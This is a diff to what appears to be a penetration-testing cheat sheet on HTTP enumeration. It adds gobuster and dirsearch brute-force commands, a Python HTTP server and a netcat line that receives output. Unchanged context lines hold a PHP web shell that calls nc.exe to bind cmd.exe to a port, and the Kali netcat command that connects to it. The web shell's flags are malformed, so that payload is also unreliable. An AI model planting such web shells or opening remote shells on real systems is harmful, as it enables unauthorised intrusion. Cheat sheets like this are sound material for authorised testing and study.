@@ -2,6 +2,9 @@ HTTP Enumeration
 ----------------------------------------------
 # Gobuster
 gobuster -u <targetip> -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+gobuster dir -u http://ip -w /path_to_dictionary -x txt,bak,php -t 50 -r --noerror -f
+dirsearch.py -u http://ip -w /path_to_dictionary -e txt,bak,php -t 50 -r -R 1 -x 400,401
+python3 -m http.server 9000
 ----------------------------------------------
 # nikto
 nıkto -h <targetip>
@@ -88,5 +91,5 @@ http://...../wp-content/uploads/2017/10/file.png
 <?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>
 # on kali call the shell
 nc -nv 10.11.25.59 4444
-
+nc -nv ip port > output.txt
 
